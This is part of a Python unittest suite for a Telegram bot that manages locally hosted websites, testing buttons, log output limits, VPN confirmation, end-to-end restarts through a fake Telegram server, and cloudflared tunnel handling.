        self.sites[0] = site_json(state="stopped", desired="stopped", uptime=None)
        self.bot.handle(self.message("/site shop"))
        labels = [b["text"] for b in self.last_buttons()]
        self.assertIn("Запустить", labels)
        self.assertNotIn("Остановить", labels)

    def test_button_data_fits_telegram_limit(self):
        long_id = "a" * 40 + "-99"
        self.sites[0] = site_json(long_id, "Длинное")
        self.bot.handle(self.message(f"/site {long_id}"))
        for item in self.last_buttons():
            if "callback_data" in item:
                self.assertLessEqual(len(item["callback_data"].encode()), 64, item)

    def test_logs_are_preformatted_and_limited(self):
        self.fake_sites["shop"].run_log.tail.return_value = "я" * 10000
        self.bot.handle(self.message("/logs shop"))
        payload = self.calls[0][1]
        self.assertLessEqual(len(payload["text"]), bot.LOG_CHARS)
        self.assertEqual(payload["entities"][0]["type"], "pre")
        self.assertEqual(payload["entities"][0]["length"], len(payload["text"]))

    def test_log_entity_counts_emoji_as_two_units(self):
        self.fake_sites["shop"].run_log.tail.return_value = "😀"
        self.bot.handle(self.message("/logs shop"))
        self.assertEqual(self.calls[0][1]["entities"][0]["length"], 2)

    def test_logs_button_can_show_deploy_log(self):
        self.bot.handle(self.press("logs:deploy:shop"))
        self.assertEqual(self.texts()[-1], "строка установки")

    def test_vpn_needs_confirmation(self):
        self.bot.handle(self.message("/vpn on"))
        self.manager.vpn_command.assert_not_called()
        self.assertIn("Включить VPN", self.texts()[-1])
        self.bot.handle(self.press(self.button_data("Да")))
        self.manager.vpn_command.assert_called_once_with("up")

    def test_vpn_card_toggle(self):
        self.bot.handle(self.message("/vpn"))
        self.assertIn("выключен", self.texts()[0])
        self.bot.handle(self.press(self.button_data("Включить")))
        self.bot.handle(self.press(self.button_data("Да")))
        self.manager.vpn_command.assert_called_once_with("up")

    def test_vpn_output_has_no_secrets_and_handles_missing_service(self):
        self.manager.vpn_status = {"available": False}
        self.bot.handle(self.message("/vpn"))
        self.assertIn("не запущен", self.texts()[0])

    def test_edit_not_modified_is_not_an_error(self):
        def failing(method, payload, timeout=15):
            raise telegram.TelegramError("Telegram ответил ошибкой 400: message is not modified", True)

        self.tg._call = lambda m, p, timeout=15: failing(m, p) if m == "editMessageText" else {}
        self.bot.handle(self.press("sites"))

    def test_long_status_is_cut_to_telegram_limit(self):
        self.sites[:] = [site_json(f"s{i}", "Сайт" * 20) for i in range(100)]
        self.bot.handle(self.message("/status"))
        self.assertLessEqual(len(self.texts()[0]), 4096)


class BotEndToEndTests(unittest.TestCase):
    """Настоящие Manager и опрос Telegram: сообщение приходит по HTTP и перезапускает сайт."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="malinnik-e2e-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        FakeTelegram.down = False
        FakeTelegram.conflict = False
        FakeTelegram.received = []
        FakeTelegram.updates = []
        FakeTelegram.methods = []
        self.fake = http.server.ThreadingHTTPServer(("127.0.0.1", 0), FakeTelegram)
        threading.Thread(target=self.fake.serve_forever, daemon=True).start()
        self.addCleanup(self.fake.server_close)
        self.addCleanup(self.fake.shutdown)
        patch = mock.patch.object(telegram, "API", f"http://127.0.0.1:{self.fake.server_address[1]}")
        patch.start()
        self.addCleanup(patch.stop)
        self.manager = sites.Manager(self.tmp)
        self.manager.telegram.update({"token": TOKEN, "chat_id": str(OWNER), "enabled": True})
        bot.Bot(self.manager).attach()
        self.manager.run()
        self.addCleanup(self.manager.shutdown)

    def wait_for(self, predicate, timeout=30):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if predicate():
                return True
            time.sleep(0.1)
        return False

    def test_command_restarts_real_site(self):
        path = os.path.join(self.tmp, "upload.zip")
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("index.html", "x")
        site = self.manager.receive_upload(path, "Витрина.zip", None)
        self.assertTrue(self.wait_for(lambda: not site.deploy["active"] and site.state() == "running"))
        first = site.proc

        FakeTelegram.updates = [{"update_id": 10, "message": {
            "message_id": 1, "date": int(time.time()), "text": "/restart витрина",
            "chat": {"id": OWNER, "type": "private"}}}]
        self.assertTrue(self.wait_for(lambda: site.proc is not first and site.proc is not None))
        self.assertTrue(self.wait_for(lambda: any("Витрина" in m["text"] and "Порт" in m["text"]
                                                  for m in FakeTelegram.received)))

    def test_stranger_over_http_changes_nothing(self):
        FakeTelegram.updates = [{"update_id": 11, "message": {
            "message_id": 1, "date": int(time.time()), "text": "/status",
            "chat": {"id": 666, "type": "private"}}}]
        self.assertTrue(self.wait_for(lambda: self.manager.telegram.last_chat is not None))
        time.sleep(0.3)
        self.assertFalse([m for m in FakeTelegram.received if m.get("chat_id") == 666])


FAKE_CLOUDFLARED = """
import sys, time
print("2026 INF Requesting new quick Tunnel on trycloudflare.com...", flush=True)
print('2026 ERR failed: Post "https://api.trycloudflare.com/tunnel": timeout', flush=True)
mode = sys.argv[1]
if mode == "fail":
    sys.exit(1)
print("2026 INF |  https://calm-river-demo.trycloudflare.com  |", flush=True)
time.sleep(60)
"""


class TunnelTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="malinnik-tunnel-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.script = os.path.join(self.tmp, "fake.py")
        with open(self.script, "w", encoding="utf-8") as f:
            f.write(FAKE_CLOUDFLARED)
        self.urls = []
        self.tunnel = tunnel.Tunnel(os.path.join(self.tmp, "tunnel.log"), self.urls.append)
        self.addCleanup(self.tunnel.stop)

    def use(self, mode):
        command = f'"{sys.executable}" "{self.script}" {mode}'
        patch = mock.patch.object(tunnel, "command", lambda port: command)
        patch.start()
        self.addCleanup(patch.stop)

    def wait_for(self, predicate, timeout=10):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if predicate():
                return True
            time.sleep(0.05)
        return False

    def test_finds_site_url_and_not_api_url(self):
        self.use("ok")
        self.tunnel.start(8100)
        self.assertTrue(self.wait_for(lambda: self.tunnel.url))
        self.assertEqual(self.tunnel.url, "https://calm-river-demo.trycloudflare.com")
        self.assertEqual(self.urls, [self.tunnel.url])
        self.assertEqual(self.tunnel.to_json()["state"], "online")

    def test_stop_clears_url(self):
        self.use("ok")
        self.tunnel.start(8100)
        self.wait_for(lambda: self.tunnel.url)
        self.tunnel.stop()
        self.assertEqual(self.tunnel.to_json(), {"state": "off", "url": None})

    def test_failure_retries_with_pause(self):
        self.use("fail")
        self.tunnel.start(8100)
        proc = self.tunnel.proc
        self.assertTrue(self.wait_for(lambda: proc.poll() is not None))
        self.tunnel.watch()
        self.assertEqual(self.tunnel.to_json()["state"], "retrying")
        self.assertIsNotNone(self.tunnel.restart_at)
        self.tunnel.restart_at = time.time() - 1
        self.tunnel.watch()
        self.assertIsNotNone(self.tunnel.proc)

    def test_retarget_only_on_change(self):
        self.use("ok")
        self.tunnel.start(8100)
        first = self.tunnel.proc
        self.tunnel.retarget(8100)
        self.assertIs(self.tunnel.proc, first)
        self.tunnel.retarget(3000)
        self.assertIsNot(self.tunnel.proc, first)
        self.assertEqual(self.tunnel.port, 3000)

    def test_real_command_targets_localhost_only(self):
        self.assertEqual(tunnel.command(8100), "cloudflared tunnel --no-autoupdate --url http://localhost:8100")


if __name__ == "__main__":
    unittest.main()
